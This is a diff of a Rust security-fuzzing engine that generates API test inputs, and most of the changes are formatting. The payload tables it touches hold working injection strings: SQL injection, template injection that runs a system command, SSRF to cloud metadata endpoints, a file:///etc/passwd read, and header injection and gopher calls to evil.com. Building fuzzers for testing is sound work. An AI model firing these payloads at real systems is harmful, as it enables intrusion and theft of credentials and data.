@@ -1,23 +1,23 @@
 use std::collections::HashMap;
 use std::fmt;
 
-// Grammar-based generative fuzzing engine for API endpoints.
-//
-// Traditional fuzzers mutate existing inputs blindly. This engine takes
-// a different approach: it learns the *grammar* of the target API (from
-// OpenAPI specs, observed traffic, or inference), represents it as a
-// context-free grammar, then generates inputs that are syntactically
-// valid but semantically malicious.
-//
-// The result: inputs that pass schema validation and reach deep application
-// logic, where the actual vulnerabilities hide.
-//
-// Pipeline:
-// 1. Grammar extraction (OpenAPI → production rules)
-// 2. Type-aware value generation (boundary values per type)
-// 3. Attack payload injection (SQLi/XSS/SSTI into grammar slots)
-// 4. Constraint violation (violate min/max/pattern/enum constraints)
-// 5. Cross-parameter interaction (combine valid params with malicious ones)
+/// Grammar-based generative fuzzing engine for API endpoints.
+///
+/// Traditional fuzzers mutate existing inputs blindly. This engine takes
+/// a different approach: it learns the *grammar* of the target API (from
+/// OpenAPI specs, observed traffic, or inference), represents it as a
+/// context-free grammar, then generates inputs that are syntactically
+/// valid but semantically malicious.
+///
+/// The result: inputs that pass schema validation and reach deep application
+/// logic, where the actual vulnerabilities hide.
+///
+/// Pipeline:
+/// 1. Grammar extraction (OpenAPI → production rules)
+/// 2. Type-aware value generation (boundary values per type)
+/// 3. Attack payload injection (SQLi/XSS/SSTI into grammar slots)
+/// 4. Constraint violation (violate min/max/pattern/enum constraints)
+/// 5. Cross-parameter interaction (combine valid params with malicious ones)
 
 /// A single production rule in the API grammar.
 #[derive(Debug, Clone)]
@@ -91,7 +91,7 @@ impl fmt::Display for SlotType {
 }
 
 /// Constraint on a parameter extracted from the API spec.
-#[derive(Debug, Clone, Default)]
+#[derive(Debug, Clone)]
 pub struct ParamConstraint {
     pub min_length: Option<usize>,
     pub max_length: Option<usize>,
@@ -101,6 +101,21 @@ pub struct ParamConstraint {
     pub enum_values: Vec<String>,
     pub required: bool,
     pub nullable: bool,
+}
+
+impl Default for ParamConstraint {
+    fn default() -> Self {
+        Self {
+            min_length: None,
+            max_length: None,
+            min_value: None,
+            max_value: None,
+            pattern: None,
+            enum_values: Vec::new(),
+            required: false,
+            nullable: false,
+        }
+    }
 }
 
 /// An API endpoint extracted from a spec or traffic observation.
@@ -416,13 +431,7 @@ pub fn boundary_values(slot_type: SlotType) -> Vec<String> {
             "[]".into(),
             "[1]".into(),
             "[1,2,3]".into(),
-            format!(
-                "[{}]",
-                (0..1000)
-                    .map(|i| i.to_string())
-                    .collect::<Vec<_>>()
-                    .join(",")
-            ),
+            format!("[{}]", (0..1000).map(|i| i.to_string()).collect::<Vec<_>>().join(",")),
             "[[[[[[]]]]]]".into(),
             "[null,null,null]".into(),
             "[true,1,\"a\",null,[],{}]".into(),
@@ -498,15 +507,15 @@ pub fn constraint_violations(
         violations.push((format!("exceeds_max_length_{}", max_len), over));
     }
 
-    if let Some(min_len) = constraint.min_length
-        && min_len > 0
-    {
-        let under = if min_len > 1 {
-            "A".repeat(min_len - 1)
-        } else {
-            String::new()
-        };
-        violations.push((format!("below_min_length_{}", min_len), under));
+    if let Some(min_len) = constraint.min_length {
+        if min_len > 0 {
+            let under = if min_len > 1 {
+                "A".repeat(min_len - 1)
+            } else {
+                String::new()
+            };
+            violations.push((format!("below_min_length_{}", min_len), under));
+        }
     }
 
     if let Some(max_val) = constraint.max_value {
@@ -514,7 +523,10 @@ pub fn constraint_violations(
             format!("exceeds_max_value_{}", max_val),
             format!("{}", max_val + 1.0),
         ));
-        violations.push(("far_exceeds_max".into(), format!("{}", max_val * 1000.0)));
+        violations.push((
+            "far_exceeds_max".into(),
+            format!("{}", max_val * 1000.0),
+        ));
     }
 
     if let Some(min_val) = constraint.min_value {
@@ -522,14 +534,20 @@ pub fn constraint_violations(
             format!("below_min_value_{}", min_val),
             format!("{}", min_val - 1.0),
         ));
-        violations.push(("far_below_min".into(), format!("{}", min_val - 1000000.0)));
+        violations.push((
+            "far_below_min".into(),
+            format!("{}", min_val - 1000000.0),
+        ));
     }
 
     if !constraint.enum_values.is_empty() {
         violations.push(("invalid_enum".into(), "DEFINITELY_NOT_IN_ENUM".into()));
         violations.push(("empty_enum".into(), String::new()));
         if let Some(first) = constraint.enum_values.first() {
-            violations.push(("enum_with_sqli".into(), format!("{}' OR '1'='1", first)));
+            violations.push((
+                "enum_with_sqli".into(),
+                format!("{}' OR '1'='1", first),
+            ));
         }
     }
 
@@ -573,10 +591,7 @@ pub fn injection_payloads(slot_type: SlotType) -> Vec<(String, String)> {
         ("ssti_twig", "{{7*'7'}}"),
         ("ssti_freemarker", "${7*7}"),
         ("ssti_pebble", "{% set x=7*7 %}{{x}}"),
-        (
-            "ssti_thymeleaf",
-            "__${T(java.lang.Runtime).getRuntime().exec('id')}__::",
-        ),
+        ("ssti_thymeleaf", "__${T(java.lang.Runtime).getRuntime().exec('id')}__::"),
     ];
 
     let cmdi = vec![
@@ -610,21 +625,12 @@ pub fn injection_payloads(slot_type: SlotType) -> Vec<(String, String)> {
         SlotType::Email => {
             payloads.push(("email_sqli".into(), "admin'--@example.com".into()));
             payloads.push(("email_xss".into(), "<script>@evil.com".into()));
-            payloads.push((
-                "email_header_inj".into(),
-                "user@example.com\r\nBcc: spy@evil.com".into(),
-            ));
+            payloads.push(("email_header_inj".into(), "user@example.com\r\nBcc: spy@evil.com".into()));
             payloads.push(("email_ssti".into(), "{{7*7}}@example.com".into()));
         }
         SlotType::Url => {
-            payloads.push((
-                "url_ssrf_aws".into(),
-                "http://169.254.169.254/latest/meta-data/".into(),
-            ));
-            payloads.push((
-                "url_ssrf_gcp".into(),
-                "http://metadata.google.internal/computeMetadata/v1/".into(),
-            ));
+            payloads.push(("url_ssrf_aws".into(), "http://169.254.169.254/latest/meta-data/".into()));
+            payloads.push(("url_ssrf_gcp".into(), "http://metadata.google.internal/computeMetadata/v1/".into()));
             payloads.push(("url_xss".into(), "javascript:alert(document.cookie)".into()));
             payloads.push(("url_file".into(), "file:///etc/passwd".into()));
             payloads.push(("url_gopher".into(), "gopher://evil.com:25/".into()));
@@ -633,18 +639,9 @@ pub fn injection_payloads(slot_type: SlotType) -> Vec<(String, String)> {
             for (name, payload) in &nosql {
                 payloads.push((name.to_string(), payload.to_string()));
             }
-            payloads.push((
-                "json_proto_pollution".into(),
-                "{\"__proto__\":{\"admin\":true}}".into(),
-            ));
-            payloads.push((
-                "json_constructor".into(),
-                "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}".into(),
-            ));
-            payloads.push((
-                "json_sqli".into(),
-                "{\"$where\":\"this.password == 'x' || 1==1\"}".into(),
-            ));
+            payloads.push(("json_proto_pollution".into(), "{\"__proto__\":{\"admin\":true}}".into()));
+            payloads.push(("json_constructor".into(), "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}".into()));
+            payloads.push(("json_sqli".into(), "{\"$where\":\"this.password == 'x' || 1==1\"}".into()));
         }
         _ => {
             for (name, payload) in &sqli {
@@ -876,7 +873,10 @@ pub fn generate_test_cases(endpoint: &ApiEndpoint) -> Vec<GeneratedTestCase> {
     cases
 }
 
-fn generate_body_test_cases(endpoint: &ApiEndpoint, body: &RequestBody) -> Vec<GeneratedTestCase> {
+fn generate_body_test_cases(
+    endpoint: &ApiEndpoint,
+    body: &RequestBody,
+) -> Vec<GeneratedTestCase> {
     let mut cases = Vec::new();
 
     for field in &body.schema {
@@ -885,16 +885,10 @@ fn generate_body_test_cases(endpoint: &ApiEndpoint, body: &RequestBody) -> Vec<G
             let mut body_obj = HashMap::new();
             for other in &body.schema {
                 if other.name != field.name {
-                    body_obj.insert(
-                        other.name.clone(),
-                        format!("\"{}\"", default_value(other.slot_type)),
-                    );
+                    body_obj.insert(other.name.clone(), format!("\"{}\"", default_value(other.slot_type)));
                 }
             }
-            body_obj.insert(
-                field.name.clone(),
-                format!("\"{}\"", value.replace('\"', "\\\"")),
-            );
+            body_obj.insert(field.name.clone(), format!("\"{}\"", value.replace('\"', "\\\"")));
 
             let body_str = format!(
                 "{{{}}}",
@@ -916,7 +910,10 @@ fn generate_body_test_cases(endpoint: &ApiEndpoint, body: &RequestBody) -> Vec<G
                 headers,
                 strategy: MutationStrategy::PayloadInjection,
                 target_param: field.name.clone(),
-                description: format!("Body injection '{}' into field '{}'", label, field.name),
+                description: format!(
+                    "Body injection '{}' into field '{}'",
+                    label, field.name
+                ),
             });
         }
     }
@@ -966,7 +963,9 @@ pub fn summarize_generation(cases: &[GeneratedTestCase]) -> GenerationSummary {
     let mut endpoints: std::collections::HashSet<String> = std::collections::HashSet::new();
 
     for case in cases {
-        *by_strategy.entry(case.strategy.to_string()).or_insert(0) += 1;
+        *by_strategy
+            .entry(case.strategy.to_string())
+            .or_insert(0) += 1;
         *by_param.entry(case.target_param.clone()).or_insert(0) += 1;
         endpoints.insert(case.endpoint.clone());
     }
